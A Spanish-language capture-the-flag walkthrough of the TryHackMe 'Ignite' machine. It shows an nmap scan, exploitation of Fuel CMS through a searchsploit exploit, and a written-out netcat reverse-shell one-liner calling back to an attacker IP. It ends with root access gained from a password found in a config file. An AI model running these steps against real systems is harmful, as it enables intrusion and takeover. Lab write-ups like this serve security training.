---
layout: page
title: "Write-up: Ignite"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---
**Write-up**: **Ignite** - TryHackMe  
**Fecha**: 01/05/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Medio
**IP de la Máquina**: 10.129.134.69

---

# 1. Reconocimiento y Enumeración

## 1.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -O -Pn 10.129.134.69
```

**Resultados:** 

![image.png](/assets/images/Ignite/image.png)

# 2. Explotación (Acceso Inicial)

## 2.1 Ejecución y Shell

1. Accedi al panel de admin con las credenciales que me daban en la pagina web

![image.png](/assets/images/Ignite/image%201.png)

1. Parece que la pagina usa Fuel CMS

![image.png](/assets/images/Ignite/image%202.png)

1. Utilicé searchsploit para buscar un exploit

![image.png](/assets/images/Ignite/image%203.png)

1. Copie el script y accedi a el para revisarlo

![image.png](/assets/images/Ignite/image%204.png)

1. Ejecute el script con las variables que pediany cree un reverse shell con ella

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.146.227 4002 > /tmp/f
```

![image.png](/assets/images/Ignite/image%205.png)

![image.png](/assets/images/Easy%20Peasy/image%2014.png)

# 3. Escalada de Privilegios (System / Root)

## 3.1 Explotación y Acceso SYSTEM

1. Revisando los archivos encontre `/var/www/html/fuel/application/config/database.php` que tenia las credenciales de root

Credenciales: `root:mememe`

![image.png](/assets/images/Ignite/image%206.png)

1. Intentamos logearnos, pero primero necesitamos una terminal por lo que la creamos usando python y nos logeamos como root usando sus crendenciales

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](/assets/images/Ignite/image%207.png)

¡Acceso como **Root** concedido!